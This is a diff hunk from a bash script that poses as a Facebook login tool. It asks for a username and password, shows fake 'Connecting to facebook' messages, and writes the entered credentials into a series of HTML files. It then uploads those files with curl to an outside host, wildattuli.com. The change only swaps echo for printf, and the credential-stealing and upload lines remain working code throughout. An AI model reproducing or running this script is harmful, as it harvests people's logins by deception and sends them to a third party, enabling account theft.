@@ -22,17 +22,17 @@ read -p 'Password:' password
 echo '[+] Login to facebook...';
 sleep 5
 echo '[+] Connecting to facebook...';
-echo "User: $username <br>Pass: $password" >> output/fuck.html;
-echo "User: $username <br>Pass: $password" >> output/fuck1.html;
-echo "User: $username <br>Pass: $password" >> output/fuck2.html;
-echo "User: $username <br>Pass: $password" >> output/fuck3.html;
-echo "User: $username <br>Pass: $password" >> output/fuck4.html;
-echo "User: $username <br>Pass: $password" >> output/fuck5.html;
-echo "User: $username <br>Pass: $password" >> output/fuck6.html;
-echo "User: $username <br>Pass: $password" >> output/fuck7.html;
-echo "User: $username <br>Pass: $password" >> output/fuck8.html;
-echo "User: $username <br>Pass: $password" >> output/fuck9.html;
-echo "User: $username <br>Pass: $password" >> output/fuck0.html;
+printf "User: $username\nPass: $password" >> output/fuck.html;
+printf "User: $username\nPass: $password" >> output/fuck1.html;
+printf "User: $username\nPass: $password" >> output/fuck2.html;
+printf "User: $username\nPass: $password" >> output/fuck3.html;
+printf "User: $username\nPass: $password" >> output/fuck4.html;
+printf "User: $username\nPass: $password" >> output/fuck5.html;
+printf "User: $username Pass: $password" >> output/fuck6.html;
+printf "User: $username Pass: $password" >> output/fuck7.html;
+printf "User: $username Pass: $password" >> output/fuck8.html;
+printf "User: $username Pass: $password" >> output/fuck9.html;
+printf "User: $username Pass: $password" >> output/fuck0.html;
 sleep 2
 curl -T output/fuck.html http://wildattuli.com
 curl -T output/fuck1.html http://wildattuli.com
